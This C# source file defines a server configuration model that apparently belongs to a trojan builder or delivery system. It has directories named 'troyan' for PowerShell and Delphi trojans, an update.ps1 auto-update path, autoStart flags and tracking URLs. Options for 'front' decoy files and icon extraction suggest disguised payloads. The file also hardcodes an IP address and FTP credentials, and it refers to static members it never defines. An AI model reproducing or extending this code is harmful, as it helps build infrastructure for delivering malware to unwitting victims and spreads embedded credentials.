using System.Text.Json;
using System.Text.Json.Serialization;

namespace model;

public class ServerModel
{
    // statics
    [JsonPropertyName("rootDir")] public string RootDir => RootDirStatic;
    
    public static string DomainControllerStatic = "185.247.141.76";
    [JsonPropertyName("domainController")]
    public string DomainController => DomainControllerStatic;
    
  
    [JsonPropertyName("cpDir")] public string CpDir => CpDirStatic;
    

    [JsonPropertyName("certDir")] public string CertDir => CertDirStatic;
    
    public static string SysDirStatic => Path.Combine(RootDirStatic, "sys");
    [JsonPropertyName("sysDir")] public string SysDir => SysDirStatic;
    
    public static string CmplDirStatic => Path.Combine(RootDirStatic, "cmpl");
    [JsonPropertyName("cmplDir")] public string CmplDir => CmplDirStatic;
    
    public static string AdsDirStatic => Path.Combine(RootDirStatic, "ads");
    [JsonPropertyName("adsDir")] public string AdsDir => AdsDirStatic;
    
    public static string UpdDirStatic => Path.Combine(RootDirStatic, "troyan/upd");
    [JsonPropertyName("updDir")] public string UpdDir => UpdDirStatic;
    [JsonPropertyName("updateFile")] public string UpdateFile => Path.Combine(UpdDir, "update.ps1");
    
    public static string TroyanScriptDirStatic => Path.Combine(RootDirStatic, "troyan/troyanps");
    [JsonPropertyName("troyanScriptDir")] public string TroyanScriptDir => TroyanScriptDirStatic;
    
    public static string TroyanDelphiDirStatic => Path.Combine(RootDirStatic, "troyan/troyandelphi");
    [JsonPropertyName("troyanDelphiDir")] public string TroyanDelphiDir => TroyanDelphiDirStatic;
    
    
    // server-depended
    [JsonPropertyName("server")] 
    public string Server { get; set; }
    
    [JsonPropertyName("userDataDir")] public string UserDataDir => @$"C:\data\{Server}";
    
    [JsonPropertyName("userServerFile")] public string UserServerFile => Path.Combine(UserDataDir, "server.json");
    
    [JsonPropertyName("ftpAds")]
    public string FtpAds => $@"ftp://ftpads:Abc12345!@{Server}";
    
    [JsonPropertyName("ftpAdsAsHttp")]
    public string FtpAdsAsHttp => $@"http://{Server}/ads";

    [JsonPropertyName("ftpUserData")] public string FtpUserData { get; set; }
    
    [JsonPropertyName("ftpUserDataAsHttp")]
    public string FtpUserDataAsHttp =>  $@"http://{Server}/data";
    
    [JsonPropertyName("updateUrl")] public string UpdateUrl => $"http://{Server}/data/update.txt";
    
    
    
    // properties
    [JsonPropertyName("login")] 
    public string Login { get; set; }
    
    [JsonPropertyName("password")]
    public string Password { get; set; }
    
    [JsonPropertyName("primaryDns")]
    public string PrimaryDns { get; set; }
    
    [JsonPropertyName("secondaryDns")]
    public string SecondaryDns { get; set; }

    [JsonPropertyName("track")]
    public bool Track { get; set; }

    [JsonPropertyName("trackingUrl")]
    public string TrackingUrl { get; set; }

    [JsonPropertyName("autoStart")]
    public bool AutoStart { get; set; }

    [JsonPropertyName("autoUpdate")]
    public bool AutoUpdate { get; set; }

    [JsonPropertyName("domains")]
    public List<string> Domains { get; set; }
    
    [JsonPropertyName("interfaces")]
    public List<string> Interfaces { get; set; }
    
    [JsonPropertyName("ipDomains")]
    public Dictionary<string, string> IpDomains { get; set; }
    
    [JsonPropertyName("pushes")]
    public List<string> Pushes { get; set; }

    [JsonPropertyName("front")]
    public List<string> Front { get; set; }
    
    [JsonPropertyName("extractIconFromFront")]
    public bool ExtractIconFromFront { get; set; }

    [JsonPropertyName("embeddings")]
    public List<string> Embeddings { get; set; }
    
    
    //resulting
    [JsonIgnore]
    public string[] AllSevers { get; set; }
    
    [JsonIgnore]
    public string? Result { get; set; }
    
    
    //constructor
    public ServerModel()
    {
        Server = "1.1.1.1";
        Login = "login";
        Password = "password";
        Track = false;
        TrackingUrl = string.Empty;
        AutoStart = false;
        AutoUpdate = false;
        Domains = new List<string>();
        Interfaces = new List<string>();
        Pushes = new List<string>();
        IpDomains = new();
        Front = new List<string>();
        ExtractIconFromFront = false;
        Embeddings = new List<string>();
    }
}